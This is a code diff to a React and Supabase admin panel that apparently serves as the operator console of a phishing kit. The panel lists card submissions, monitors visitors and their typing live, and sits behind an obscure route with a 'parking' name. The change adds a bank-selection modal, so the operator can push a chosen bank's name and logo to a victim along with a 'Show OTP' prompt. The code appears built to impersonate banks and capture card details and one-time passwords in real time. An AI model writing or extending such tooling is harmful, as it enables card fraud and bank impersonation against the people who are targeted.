@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
 import { supabase } from '@/integrations/supabase/client';
@@ -6,6 +5,7 @@ import TypingDetector from './TypingDetector';
 import EnhancedVisitorInfo from './EnhancedVisitorInfo';
 import AdminChat from './AdminChat';
 import LiveVisitorNotification from './LiveVisitorNotification';
+import BankSelectionModal from './BankSelectionModal';
 
 interface CardSubmission {
   id: string;
@@ -36,6 +36,8 @@ const AdminPanel = () => {
   const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
   const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
   const [notification, setNotification] = useState<string>('');
+  const [showBankModal, setShowBankModal] = useState(false);
+  const [selectedSubmissionId, setSelectedSubmissionId] = useState<string>('');
 
   const showNotification = (message: string) => {
     setNotification(message);
@@ -195,17 +197,24 @@ const AdminPanel = () => {
     };
   }, []);
 
-  const sendCommand = async (command: string, submissionId?: string) => {
-    console.log('Sending command via Supabase:', command, submissionId);
+  const sendCommand = async (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
+    console.log('Sending command via Supabase:', command, submissionId, bankData);
     showNotification(`${command.toUpperCase()} has been initiated`);
     
     try {
+      const commandData: any = {
+        command,
+        submission_id: submissionId || null
+      };
+      
+      if (bankData) {
+        commandData.bank_name = bankData.name;
+        commandData.bank_logo = bankData.logo;
+      }
+      
       const { error } = await supabase
         .from('admin_commands')
-        .insert([{
-          command,
-          submission_id: submissionId || null
-        }]);
+        .insert([commandData]);
       
       if (error) {
         console.error('Error sending command:', error);
@@ -255,9 +264,25 @@ const AdminPanel = () => {
     }
   };
 
+  const handleShowOtp = (submissionId: string) => {
+    setSelectedSubmissionId(submissionId);
+    setShowBankModal(true);
+  };
+
+  const handleBankSelect = (bankName: string, bankLogo: string) => {
+    sendCommand('showotp', selectedSubmissionId, { name: bankName, logo: bankLogo });
+  };
+
   return (
     <div className="min-h-screen bg-gray-900 text-white p-6">
       <LiveVisitorNotification visitors={activeVisitors} />
+      
+      <BankSelectionModal
+        isOpen={showBankModal}
+        onClose={() => setShowBankModal(false)}
+        onSelectBank={handleBankSelect}
+        submissionId={selectedSubmissionId}
+      />
       
       <div className="flex justify-between items-center mb-8">
         <h1 className="text-3xl font-bold">Admin Panel - /parking55009hvSweJimbs5hhinbd56y</h1>
@@ -351,7 +376,7 @@ const AdminPanel = () => {
                     <TableCell className="text-white">
                       <div className="flex space-x-1">
                         <button
-                          onClick={(e) => { e.stopPropagation(); sendCommand('showotp', submission.id); }}
+                          onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
                           className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs"
                         >
                           Show OTP
